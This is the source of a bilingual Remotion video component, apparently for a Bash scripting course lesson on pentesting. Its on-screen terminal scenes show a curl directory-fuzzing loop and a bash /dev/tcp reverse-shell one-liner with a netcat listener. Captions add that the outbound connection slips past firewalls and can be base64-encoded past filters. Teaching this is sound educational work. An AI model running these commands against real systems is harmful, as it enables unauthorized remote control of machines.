// ── video/remotion/compositions/Sl05ReverseShells.tsx ────────────
// Video: pentesting II — automatización y reverse shells.
// Clase 5 de Scripting/Bash (lección bash-05). Guiones: voicebox-scripts/sl-05-*.txt
// Versión unificada ES/EN con `lang` prop.

import React from 'react';
import { AbsoluteFill, Sequence, staticFile, useVideoConfig } from 'remotion';
import { Audio } from '@remotion/media';
import { sceneStartFrames, audioTimings, audioBase, hasAudio } from '../audioTimings';
import { THEME, MONO } from '../theme';
import { FontFace } from '../fonts';
import { RevealLine } from '../primitives/RevealLine';
import { KeyCapsule } from '../primitives/KeyCapsule';
import { TerminalWindow } from '../primitives/TerminalWindow';

const CENTERED: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  justifyContent: 'center',
  alignItems: 'center',
  height: '100%',
  textAlign: 'center',
};

const VID = 'sl-05-reverse-shells';

// ── COPY ────────────────────────────────────────────────────────────
const COPY = {
  es: {
    s1: {
      title: <>AUTOMATIZACIÓN Y <span style={{ color: THEME.red }}>REVERSE SHELLS</span></>,
      subtitle: 'de scripts que reconocen, a scripts que atacan',
      capsuleLabel: 'dos jugadas finales',
      capsuleValue: 'cerrás el círculo',
      points: ['automatizar un ataque con una wordlist', 'levantar una reverse shell con bash'],
    },
    s2: {
      title: <>WORDLIST: <span style={{ color: THEME.green }}>PROBAR CANDIDATO POR CANDIDATO</span></>,
      terminalTitle: 'kali@attacker-01:~$ nano fuzz.sh',
      terminalLines: [
        { parts: [{ color: 'cyan', text: 'while' }, { color: 'text', text: ' read dir; ' }, { color: 'cyan', text: 'do' }] },
        { color: 'text', text: '  code=$(curl -s -o /dev/null -w "%{http_code}" http://10.0.0.11/$dir)' },
        { color: 'text', text: '  echo "$dir → $code"' },
        { parts: [{ color: 'cyan', text: 'done' }, { color: 'text', text: ' < wordlist.txt' }] },
        { color: 'amber', text: 'admin → 200   backup → 200   test → 404' },
      ],
      capsule1: { label: '200', value: 'existe' },
      capsule2: { label: '404', value: 'no existe' },
    },
    s3: {
      title: <>REVERSE SHELL: <span style={{ color: THEME.red }}>EL OBJETIVO SE CONECTA HACIA VOS</span></>,
      terminalTitle: 'kali@attacker-01:~$ nc -lvnp 4444',
      terminalLines: [
        { color: 'dim', text: '# en el objetivo:' },
        { color: 'red', text: 'bash -i >& /dev/tcp/10.0.0.10/4444 0>&1' },
        { color: 'dim', text: 'Listening on 0.0.0.0 4444' },
        { color: 'dim', text: 'Connection received on 10.0.0.11' },
        { color: 'green', text: 'root@target:~#' },
      ],
      capsule1: { label: 'conexión saliente', value: 'saltea firewalls' },
      capsule2: { label: 'con filtros', value: 'la encodás en base64' },
    },
  },
  en: {
    s1: {
      title: <>AUTOMATION AND <span style={{ color: THEME.red }}>REVERSE SHELLS</span></>,
      subtitle: 'from scripts that scout, to scripts that attack and hand you control',
      capsuleLabel: 'two final plays',
      capsuleValue: 'close the circle',
      points: ['automating an attack against a wordlist — candidate after candidate, without getting tired', "standing up a reverse shell once you've already gotten access — drive the target from your machine"],
    },
    s2: {
      title: <>WORDLIST: <span style={{ color: THEME.green }}>TRYING CANDIDATE AFTER CANDIDATE</span></>,
      terminalTitle: 'kali@attacker-01:~$ nano fuzz.sh',
      terminalLines: [
        { parts: [{ color: 'cyan', text: 'while' }, { color: 'text', text: ' read dir; ' }, { color: 'cyan', text: 'do' }] },
        { color: 'text', text: '  code=$(curl -s -o /dev/null -w "%{http_code}" http://10.0.0.11/$dir)' },
        { color: 'text', text: '  echo "$dir → $code"' },
        { parts: [{ color: 'cyan', text: 'done' }, { color: 'text', text: ' < wordlist.txt' }] },
        { color: 'amber', text: 'admin → 200   backup → 200   test → 404' },
      ],
      capsule1: { label: '200', value: "it exists" },
      capsule2: { label: '404', value: "it doesn't" },
      extraReveal: 'with a loop and a wordlist, you fuzz directories in seconds',
    },
    s3: {
      title: <>REVERSE SHELL: <span style={{ color: THEME.red }}>THE TARGET CONNECTS BACK TO YOU</span></>,
      terminalTitle: 'kali@attacker-01:~$ nc -lvnp 4444',
      terminalLines: [
        { color: 'dim', text: '# on the target:' },
        { color: 'red', text: 'bash -i >& /dev/tcp/10.0.0.10/4444 0>&1' },
        { color: 'dim', text: 'Listening on 0.0.0.0 4444' },
        { color: 'dim', text: 'Connection received on 10.0.0.11' },
        { color: 'green', text: 'root@target:~#' },
      ],
      capsule1: { label: 'outgoing connection', value: 'slips past firewalls' },
      capsule2: { label: 'if filters block it', value: 'encode in base64' },
    },
  },
};

// ── BEATS ───────────────────────────────────────────────────────────
const BEATS = {
  es: {
    s1: { capsuleDelay: 3, points: [7, 11] },
    s2: { terminalDelay: 2.5, capsule1Delay: 11, capsule2Delay: 16 },
    s3: { terminalDelay: 2.5, capsule1Delay: 11, capsule2Delay: 16 },
  },
  en: {
    s1: { capsuleDelay: 0.2, points: [3.7, 10.0] },
    s2: { terminalDelay: 7.5, capsule1Delay: 19.2, capsule2Delay: 21.2, extraRevealAt: 24.1 },
    s3: { terminalDelay: 15.9, capsule1Delay: 4.1, capsule2Delay: 24.6 },
  },
};

// ── Scene 1 ─────────────────────────────────────────────────────────
const Scene1: React.FC<{ fps: number; c: typeof COPY.es.s1; b: typeof BEATS.es.s1 }> = ({ fps, c, b }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 30, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 22 }}>
      {c.title}
    </div>
    <div style={{ fontSize: 18, color: THEME.muted, fontFamily: MONO, marginBottom: 28 }}>
      {c.subtitle}
    </div>
    <KeyCapsule label={c.capsuleLabel} value={c.capsuleValue} accent={THEME.cyan} delay={Math.round(b.capsuleDelay * fps)} size={24} />
    <div style={{ marginTop: 18, fontSize: 16, color: THEME.muted, fontFamily: MONO }}>
      {c.points.map((point, i) => (
        <React.Fragment key={i}>
          {i > 0 && <br />}
          <RevealLine at={b.points[i]} fps={fps} mark="▸" color={THEME.cyan}>{point}</RevealLine>
        </React.Fragment>
      ))}
    </div>
  </AbsoluteFill>
);

// ── Scene 2 ─────────────────────────────────────────────────────────
const Scene2: React.FC<{ fps: number; c: typeof COPY.es.s2; b: typeof BEATS.es.s2 }> = ({ fps, c, b }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 20 }}>
      {c.title}
    </div>
    <TerminalWindow title={c.terminalTitle} width={940} delay={Math.round(b.terminalDelay * fps)}>
      <div style={{ fontSize: 14, whiteSpace: 'pre', lineHeight: 1.7 }}>
        {c.terminalLines.map((line, i) => (
          <React.Fragment key={i}>
            {i > 0 && '\n'}
            {'parts' in line ? (
              (line.parts ?? []).map((p, j) => (
                <span key={j} style={{ color: THEME[p.color as keyof typeof THEME] }}>{p.text}</span>
              ))
            ) : (
              <span style={{ color: THEME[line.color as keyof typeof THEME] }}>{line.text}</span>
            )}
          </React.Fragment>
        ))}
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 16, marginTop: 24 }}>
      <KeyCapsule label={c.capsule1.label} value={c.capsule1.value} accent={THEME.green} delay={Math.round(b.capsule1Delay * fps)} size={20} />
      <KeyCapsule label={c.capsule2.label} value={c.capsule2.value} accent={THEME.red} delay={Math.round(b.capsule2Delay * fps)} size={20} />
    </div>
    {'extraReveal' in c && 'extraRevealAt' in b && (
      <div style={{ marginTop: 16, fontSize: 15, color: THEME.muted, fontFamily: MONO }}>
        <RevealLine at={(b as any).extraRevealAt} fps={fps} mark="▸" color={THEME.amber}>{(c as any).extraReveal}</RevealLine>
      </div>
    )}
  </AbsoluteFill>
);

// ── Scene 3 ─────────────────────────────────────────────────────────
const Scene3: React.FC<{ fps: number; c: typeof COPY.es.s3; b: typeof BEATS.es.s3 }> = ({ fps, c, b }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 20 }}>
      {c.title}
    </div>
    <TerminalWindow title={c.terminalTitle} width={940} delay={Math.round(b.terminalDelay * fps)}>
      <div style={{ fontSize: 14, whiteSpace: 'pre', lineHeight: 1.7 }}>
        {c.terminalLines.map((line, i) => (
          <React.Fragment key={i}>
            {i > 0 && '\n'}
            <span style={{ color: THEME[line.color as keyof typeof THEME] }}>{line.text}</span>
          </React.Fragment>
        ))}
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 16, marginTop: 24 }}>
      <KeyCapsule label={c.capsule1.label} value={c.capsule1.value} accent={THEME.red} delay={Math.round(b.capsule1Delay * fps)} size={20} />
      <KeyCapsule label={c.capsule2.label} value={c.capsule2.value} accent={THEME.amber} delay={Math.round(b.capsule2Delay * fps)} size={20} />
    </div>
  </AbsoluteFill>
);

// ── Componente principal ────────────────────────────────────────────
export const Sl05ReverseShells: React.FC<{ lang?: 'es' | 'en' }> = ({ lang = 'es' }) => {
  const { fps } = useVideoConfig();
  const c = COPY[lang];
  const b = BEATS[lang];

  const [s1, s2, s3] = audioTimings(VID, lang);
  const starts = sceneStartFrames(VID, fps, lang);
  const dur1 = Math.ceil(s1 * fps);
  const dur2 = Math.ceil(s2 * fps);
  const dur3 = Math.ceil(s3 * fps) + fps;
  const base = audioBase(lang);

  return (
    <AbsoluteFill style={{ background: THEME.bg, padding: 60, fontFamily: MONO }}>
      <FontFace />
      <Sequence from={starts[0]} durationInFrames={dur1}>
        {hasAudio(VID) && <Audio src={staticFile(`${base}/${VID}/sl-05-scene1.wav`)} />}
        <Scene1 fps={fps} c={c.s1} b={b.s1} />
      </Sequence>
      <Sequence from={starts[1]} durationInFrames={dur2}>
        {hasAudio(VID) && <Audio src={staticFile(`${base}/${VID}/sl-05-scene2.wav`)} />}
        <Scene2 fps={fps} c={c.s2} b={b.s2} />
      </Sequence>
      <Sequence from={starts[2]} durationInFrames={dur3}>
        {hasAudio(VID) && <Audio src={staticFile(`${base}/${VID}/sl-05-scene3.wav`)} />}
        <Scene3 fps={fps} c={c.s3} b={b.s3} />
      </Sequence>
    </AbsoluteFill>
  );
};
